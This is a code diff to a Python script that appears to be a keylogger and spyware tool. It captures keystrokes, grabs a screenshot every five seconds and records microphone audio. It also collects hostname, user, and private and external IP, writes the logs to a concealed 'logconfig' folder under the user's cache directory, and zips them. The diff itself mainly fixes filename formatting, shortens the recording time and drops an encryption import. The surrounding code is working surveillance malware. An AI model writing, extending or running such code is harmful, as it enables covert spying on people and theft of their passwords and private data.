@@ -21,8 +21,6 @@ import threading
 from scipy.io.wavfile import write
 import sounddevice as sd
 
-from cryptography.fernet import Fernet
-
 import getpass
 from requests import get
 
@@ -34,6 +32,14 @@ from datetime import datetime
 import sys
 from zipfile import ZipFile
 
+# Date and time formatter function
+
+def date_time_formatter(datetime_val):
+
+    # colon (:) is not allowed in filenames on Windows. Hence the formatter.
+
+    return str(datetime_val)[0:10] + "_" +  str(datetime_val)[11:13] + "-" + str(datetime_val)[14:16] + "-" + str(datetime_val)[17:19]
+    
 # OS information fetch
 
 current_OS = platform.system()
@@ -47,7 +53,7 @@ directory_name = "logconfig"
 if(current_OS == 'Linux'):
     logpath = "/home/" + current_user + "/.cache/" + directory_name + "/"
 elif(current_OS == 'Windows'):
-    logpath = "C:\\Users\\" + current_user + "\\" + directory_name + "\\"
+    logpath = "C:\\temp\\" + current_user + "\\" + directory_name + "\\"
     
 if not os.path.exists(logpath):
     os.makedirs(logpath)
@@ -65,9 +71,10 @@ keys_information = "key_log.txt"
 # clipboard_information_enc = 'enc_clipboard.txt'
 # keys_information_enc = 'enc_keys_logged.txt'
 
-duration = 45
+duration = 15
 stopping_time = 0
-file_prefix = str(datetime.now())[0:19]
+current_date_time = datetime.now()
+file_prefix = date_time_formatter(current_date_time)
 
 def on_press_func(key):
         try:
@@ -82,7 +89,7 @@ def take_screenshot(flag_take_screenshot):
     iteration = 1
     while flag_take_screenshot.is_set():
         screenshot = ImageGrab.grab()
-        screenshot.save(logpath + file_prefix + " - " + "screenshot" + str(iteration) + ".png")
+        screenshot.save(logpath + file_prefix + "_" + "screenshot" + str(iteration) + ".png")
         screenshot.close()
         time.sleep(5)
         iteration += 1
@@ -97,8 +104,6 @@ sys_details.update({'uname' : platform.uname()})
 sys_details.update({'hostname' : socket.gethostname()})
 sys_details.update({'current_user' : current_user})
 
-# print(sys_details.items())
-
 # sys_details[internal_IP] = socket.gethostbyname(hostname) # Usually returns loopback address
 
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
@@ -107,7 +112,7 @@ s.connect(("8.8.8.8", 80))
 sys_details.update({'private_IP' : s.getsockname()[0] }) # Will return the private IP of the machine
 sys_details.update({'external_IP' : get('https://api.ipify.org').text})
 
-sys_f = open(logpath + file_prefix + " - " + system_information, 'a')
+sys_f = open(logpath + file_prefix + "_" + system_information, 'a')
 
 for item in sys_details.items():
     sys_f.write(str(item) + '\n\n')
@@ -128,7 +133,7 @@ sampling_freq = 44100
 
 myrecording = sd.rec(int(duration * sampling_freq), samplerate=sampling_freq, channels=2)
 
-key_f = open(logpath + file_prefix + " - " + keys_information, 'a')
+key_f = open(logpath + file_prefix + "_" + keys_information, 'a')
 
 stopping_time = time.time() + duration
 
@@ -139,14 +144,14 @@ with Listener(
 key_f.close()
 sd.wait()
 
-write(logpath + file_prefix + " - " + audio_information, sampling_freq, myrecording)
+write(logpath + file_prefix + "_" + audio_information, sampling_freq, myrecording)
 
 flag_take_screenshot.clear()
 
 # Creating zipfile of all log files
 
 all_files = os.listdir(logpath)
-zipfile_name = 'Zipped_logs_' + str(datetime.now()) + '.zip'
+zipfile_name = 'Zipped_logs_' + date_time_formatter(current_date_time) + '.zip'
 zipfile_full_path = logpath + zipfile_name
 
 with ZipFile(zipfile_full_path, 'w') as zipobj:
